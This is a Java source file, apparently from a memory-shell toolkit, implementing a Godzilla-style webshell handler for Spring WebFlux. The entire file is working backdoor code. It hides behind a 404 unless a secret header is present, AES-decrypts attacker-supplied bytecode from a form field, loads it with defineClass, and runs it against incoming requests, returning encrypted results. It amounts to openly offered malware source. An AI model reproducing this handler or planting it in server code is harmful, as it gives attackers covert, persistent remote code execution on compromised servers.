package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;
import reactor.core.publisher.Mono;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class GodzillaHandlerMethod extends ClassLoader {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;
    public Class<?> payload;

    public GodzillaHandlerMethod() {
    }

    public GodzillaHandlerMethod(ClassLoader parent) {
        super(parent);
    }

    public ResponseEntity<?> invoke(ServerWebExchange exchange) {
        String value = exchange.getRequest().getHeaders().getFirst(headerName);
        if (value == null || !value.contains(headerValue)) {
            return ResponseEntity.notFound().build();
        }
        Object bufferStream = exchange.getFormData().flatMap(map -> {
            StringBuilder result = new StringBuilder();
            try {
                byte[] data = base64Decode(map.getFirst(pass));
                data = x(data, false);
                if (payload == null) {
                    payload = new GodzillaHandlerMethod(Thread.currentThread().getContextClassLoader()).defineClass(null, data, 0, data.length);
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = payload.getDeclaredConstructor().newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(exchange.getRequest());
                    f.toString();
                    result.append(md5.substring(0, 16));
                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
                    result.append(md5.substring(16));
                }
            } catch (Throwable ex) {
                ex.printStackTrace();
                result.append(ex.getMessage());
            }
            return Mono.just(result.toString());
        });
        return ResponseEntity.ok(bufferStream);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }
}
